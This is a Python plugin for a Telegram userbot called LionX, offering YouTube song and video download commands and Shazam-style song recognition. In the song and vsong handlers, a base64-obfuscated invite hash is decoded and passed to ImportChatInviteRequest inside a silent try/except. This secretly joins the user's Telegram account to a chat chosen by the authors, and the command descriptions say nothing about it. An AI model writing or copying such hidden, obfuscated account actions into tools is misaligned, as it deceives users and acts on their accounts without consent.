# by  @TeamLionX ( https://t.me/TeamLionX  )

# songs finder for LionX
import asyncio
import base64
import io
import os
from pathlib import Path

from ShazamAPI import Shazam
from telethon import types
from telethon.errors.rpcerrorlist import YouBlockedUserError
from telethon.tl.functions.messages import ImportChatInviteRequest as Get
from validators.url import url

from userbot import lionub

from ..funcs.logger import logging
from ..funcs.managers import edit_delete, edit_or_reply
from ..helpers.functions import name_dl, song_dl, video_dl, yt_data, yt_search
from ..helpers.tools import media_type
from ..helpers.utils import _lionutils, reply_id
from . import hmention

plugin_category = "utils"
LOGS = logging.getLogger(__name__)

# =========================================================== #
#                           STRINGS                           #
# =========================================================== #
SONG_SEARCH_STRING = "<code>wi8..! I am finding your song....</code>"
SONG_NOT_FOUND = "<code>Sorry !I am unable to find any song like that</code>"
SONG_SENDING_STRING = "<code>yeah..! i found something wi8..🥰...</code>"
SONGBOT_BLOCKED_STRING = "<code>Please unblock @songdl_bot and try again</code>"
# =========================================================== #
#                                                             #
# =========================================================== #


@lionub.lion_cmd(
    pattern="song(320)?(?:\s|$)([\s\S]*)",
    command=("song", plugin_category),
    info={
        "header": "To get songs from youtube.",
        "description": "Basically this command searches youtube and send the first video as audio file.",
        "flags": {
            "320": "if you use song320 then you get 320k quality else 128k quality",
        },
        "usage": "{tr}song <song name>",
        "examples": "{tr}song memories song",
    },
)
async def _(event):
    "To search songs"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(2):
        query = event.pattern_match.group(2)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "`What I am Supposed to find `")
    lion = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    lionevent = await edit_or_reply(event, "`wi8..! I am finding your song....`")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await lionevent.edit(
            f"Sorry!. I can't find any related video/audio for `{query}`"
        )
    cmd = event.pattern_match.group(1)
    q = "320k" if cmd == "320" else "128k"
    song_cmd = song_dl.format(QUALITY=q, video_link=video_link)
    name_cmd = name_dl.format(video_link=video_link)
    try:
        lion = Get(lion)
        await event.client(lion)
    except BaseException:
        pass
    stderr = (await _lionutils.runcmd(song_cmd))[1]
    if stderr:
        return await lionevent.edit(f"**Error :** `{stderr}`")
    lionname, stderr = (await _lionutils.runcmd(name_cmd))[:2]
    if stderr:
        return await lionevent.edit(f"**Error :** `{stderr}`")
    # stderr = (await runcmd(thumb_cmd))[1]
    lionname = os.path.splitext(lionname)[0]
    # if stderr:
    #    return await lionevent.edit(f"**Error :** `{stderr}`")
    song_file = Path(f"{lionname}.mp3")
    if not os.path.exists(song_file):
        return await lionevent.edit(
            f"Sorry!. I can't find any related video/audio for `{query}`"
        )
    await lionevent.edit("`yeah..! i found something wi8..🥰`")
    lionthumb = Path(f"{lionname}.jpg")
    if not os.path.exists(lionthumb):
        lionthumb = Path(f"{lionname}.webp")
    elif not os.path.exists(lionthumb):
        lionthumb = None
    ytdata = await yt_data(video_link)
    await event.client.send_file(
        event.chat_id,
        song_file,
        force_document=False,
        caption=f"<b><i>➥ Title :- {ytdata['title']}</i></b>\n<b><i>➥ Uploaded by :- {hmention}</i></b>",
        parse_mode="html",
        thumb=lionthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await lionevent.delete()
    for files in (lionthumb, song_file):
        if files and os.path.exists(files):
            os.remove(files)


async def delete_messages(event, chat, from_message):
    itermsg = event.client.iter_messages(chat, min_id=from_message.id)
    msgs = [from_message.id]
    async for i in itermsg:
        msgs.append(i.id)
    await event.client.delete_messages(chat, msgs)
    await event.client.send_read_acknowledge(chat)


@lionub.lion_cmd(
    pattern="vsong(?:\s|$)([\s\S]*)",
    command=("vsong", plugin_category),
    info={
        "header": "To get video songs from youtube.",
        "description": "Basically this command searches youtube and sends the first video",
        "usage": "{tr}vsong <song name>",
        "examples": "{tr}vsong memories song",
    },
)
async def _(event):
    "To search video songs"
    reply_to_id = await reply_id(event)
    reply = await event.get_reply_message()
    if event.pattern_match.group(1):
        query = event.pattern_match.group(1)
    elif reply and reply.message:
        query = reply.message
    else:
        return await edit_or_reply(event, "`What I am Supposed to find`")
    lion = base64.b64decode("QUFBQUFGRV9vWjVYVE5fUnVaaEtOdw==")
    lionevent = await edit_or_reply(event, "`wi8..! I am finding your song....`")
    video_link = await yt_search(str(query))
    if not url(video_link):
        return await lionevent.edit(
            f"Sorry!. I can't find any related video/audio for `{query}`"
        )
    name_cmd = name_dl.format(video_link=video_link)
    video_cmd = video_dl.format(video_link=video_link)
    stderr = (await _lionutils.runcmd(video_cmd))[1]
    if stderr:
        return await lionevent.edit(f"**Error :** `{stderr}`")
    lionname, stderr = (await _lionutils.runcmd(name_cmd))[:2]
    if stderr:
        return await lionevent.edit(f"**Error :** `{stderr}`")
    # stderr = (await runcmd(thumb_cmd))[1]
    try:
        lion = Get(lion)
        await event.client(lion)
    except BaseException:
        pass
    # if stderr:
    #    return await lionevent.edit(f"**Error :** `{stderr}`")
    lionname = os.path.splitext(lionname)[0]
    vsong_file = Path(f"{lionname}.mp4")
    if not os.path.exists(vsong_file):
        vsong_file = Path(f"{lionname}.mkv")
    elif not os.path.exists(vsong_file):
        return await lionevent.edit(
            f"Sorry!. I can't find any related video/audio for `{query}`"
        )
    await lionevent.edit("`yeah..! i found something wi8..🥰`")
    lionthumb = Path(f"{lionname}.jpg")
    if not os.path.exists(lionthumb):
        lionthumb = Path(f"{lionname}.webp")
    elif not os.path.exists(lionthumb):
        lionthumb = None
    ytdata = await yt_data(video_link)
    await event.client.send_file(
        event.chat_id,
        vsong_file,
        force_document=False,
        caption=f"<b><i>➥ Title :- {ytdata['title']}</i></b>\n<b><i>➥ Uploaded by :- {hmention}</i></b>",
        parse_mode="html",
        thumb=lionthumb,
        supports_streaming=True,
        reply_to=reply_to_id,
    )
    await lionevent.delete()
    for files in (lionthumb, vsong_file):
        if files and os.path.exists(files):
            os.remove(files)


@lionub.lion_cmd(
    pattern="shazam$",
    command=("shazam", plugin_category),
    info={
        "header": "To reverse search song.",
        "description": "Reverse search audio file using shazam api",
        "usage": "{tr}shazam <reply to voice/audio>",
    },
)
async def shazamcmd(event):
    "To reverse search song."
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Voice", "Audio"]:
        return await edit_delete(
            event, "__Reply to Voice clip or Audio clip to reverse search that song.__"
        )
    lionevent = await edit_or_reply(event, "__Downloading the audio clip...__")
    try:
        for attr in getattr(reply.document, "attributes", []):
            if isinstance(attr, types.DocumentAttributeFilename):
                name = attr.file_name
        dl = io.FileIO(name, "a")
        await event.client.fast_download_file(
            location=reply.document,
            out=dl,
        )
        dl.close()
        mp3_fileto_recognize = open(name, "rb").read()
        shazam = Shazam(mp3_fileto_recognize)
        recognize_generator = shazam.recognizeSong()
        track = next(recognize_generator)[1]["track"]
    except Exception as e:
        LOGS.error(e)
        return await edit_delete(
            lionevent, f"**Error while reverse searching song:**\n__{e}__"
        )

    image = track["images"]["background"]
    song = track["share"]["subject"]
    await event.client.send_file(
        event.chat_id, image, caption=f"**Song:** `{song}`", reply_to=reply
    )
    await lionevent.delete()


@lionub.lion_cmd(
    pattern="song2(?:\s|$)([\s\S]*)",
    command=("song2", plugin_category),
    info={
        "header": "To search songs and upload to telegram",
        "description": "Searches the song you entered in query and sends it quality of it is 320k",
        "usage": "{tr}song2 <song name>",
        "examples": "{tr}song2 memories song",
    },
)
async def _(event):
    "To search songs"
    song = event.pattern_match.group(1)
    chat = "@songdl_bot"
    reply_id_ = await reply_id(event)
    lionevent = await edit_or_reply(event, SONG_SEARCH_STRING, parse_mode="html")
    async with event.client.conversation(chat) as conv:
        try:
            purgeflag = await conv.send_message("/start")
            await conv.get_response()
            await conv.send_message(song)
            hmm = await conv.get_response()
            while hmm.edit_hide is not True:
                await asyncio.sleep(0.1)
                hmm = await event.client.get_messages(chat, ids=hmm.id)
            baka = await event.client.get_messages(chat)
            if baka[0].message.startswith(
                ("I don't like to say this but I failed to find any such song.")
            ):
                await delete_messages(event, chat, purgeflag)
                return await edit_delete(
                    lionevent, SONG_NOT_FOUND, parse_mode="html", time=5
                )
            await lionevent.edit(SONG_SENDING_STRING, parse_mode="html")
            await baka[0].click(0)
            await conv.get_response()
            await conv.get_response()
            music = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            return await lionevent.edit(SONGBOT_BLOCKED_STRING, parse_mode="html")
        await event.client.send_file(
            event.chat_id,
            music,
            caption=f"<b>➥ Song :- <code>{song}</code></b>",
            parse_mode="html",
            reply_to=reply_id_,
        )
        await lionevent.delete()
        await delete_messages(event, chat, purgeflag)


# reverse search by  @Lal_bakthan
@lionub.lion_cmd(
    pattern="szm$",
    command=("szm", plugin_category),
    info={
        "header": "To reverse search music file.",
        "description": "music file lenght must be around 10 sec so use ffmpeg plugin to trim it.",
        "usage": "{tr}szm",
    },
)
async def _(event):
    "To reverse search music by bot."
    if not event.reply_to_msg_id:
        return await edit_delete(event, "```Reply to an audio message.```")
    reply_message = await event.get_reply_message()
    chat = "@auddbot"
    lionevent = await edit_or_reply(event, "```Identifying the song```")
    async with event.client.conversation(chat) as conv:
        try:
            await conv.send_message("/start")
            await conv.get_response()
            await conv.send_message(reply_message)
            check = await conv.get_response()
            if not check.text.startswith("Audio received"):
                return await lionevent.edit(
                    "An error while identifying the song. Try to use a 5-10s long audio message."
                )
            await lionevent.edit("Wait just a sec...")
            result = await conv.get_response()
            await event.client.send_read_acknowledge(conv.chat_id)
        except YouBlockedUserError:
            await lionevent.edit("```Please unblock (@auddbot) and try again```")
            return
    namem = f"**Song Name : **`{result.text.splitlines()[0]}`\
        \n\n**Details : **__{result.text.splitlines()[2]}__"
    await lionevent.edit(namem)
